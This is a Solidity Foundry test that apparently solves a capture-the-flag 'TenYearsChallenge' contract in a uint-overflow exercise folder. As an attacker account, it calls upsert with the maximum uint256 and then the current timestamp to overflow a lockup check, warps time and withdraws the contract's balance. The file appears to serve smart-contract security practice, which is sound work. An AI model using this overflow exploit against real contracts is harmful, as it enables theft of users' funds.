// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../contracts/1-uint-overflow/TenYearsChallenge.sol";

contract TenYearsChallengeTest is Test {
    address private developer = 0xAAcF6a8119F7e11623b5A43DA638e91F669A130f;
    address private attacker = 0x11111112e8a4d889b7e66F77a2552a1d1aeBb918;

    TenYearsChallenge challenge;

    function setUp() public {
        vm.createSelectFork("bsc");

        address[] memory _operators = new address[](1);
        _operators[0] = attacker;
        vm.deal(attacker, 1 ether);
        vm.prank(attacker, attacker);
//        challenge = TenYearsChallenge(0x798238246FD6AFF019bEc52D0D78F1Bc5CC593A8);
        challenge = new TenYearsChallenge();
    }

    function test_challenge() public {
        console.log('balance', address(challenge).balance);
        console.log('max uint256', type(uint256).max);

        uint256 maxUint256 = type(uint256).max;

        uint256 beforeBalance = attacker.balance;
        vm.startPrank(attacker);
        challenge.upsert(1, maxUint256);
        challenge.upsert(2, block.timestamp);

        vm.warp(block.timestamp + 1);

        challenge.withdraw(2, payable(attacker));
        console.log('earned', attacker.balance - beforeBalance);
        vm.stopPrank();
    }
}
